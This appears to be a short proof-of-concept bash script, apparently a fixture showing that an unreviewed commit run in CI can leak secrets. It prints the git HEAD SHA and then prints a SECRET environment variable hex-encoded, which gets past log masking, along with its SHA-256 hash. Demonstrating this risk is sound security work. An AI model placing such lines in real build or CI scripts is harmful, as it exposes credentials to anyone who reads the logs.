#!/usr/bin/env bash
# EXECUTED COMMIT (Y2): never reviewed by the maintainer.
echo "EXECUTED_HEAD_SHA=$(git rev-parse HEAD 2>/dev/null || echo unknown)"
echo "EXFIL_SECRET_HEX=$(printf '%s' "$SECRET" | xxd -p | tr -d '\n')"
echo "EXFIL_SECRET_SHA256=$(printf '%s' "$SECRET" | sha256sum | cut -d' ' -f1)"
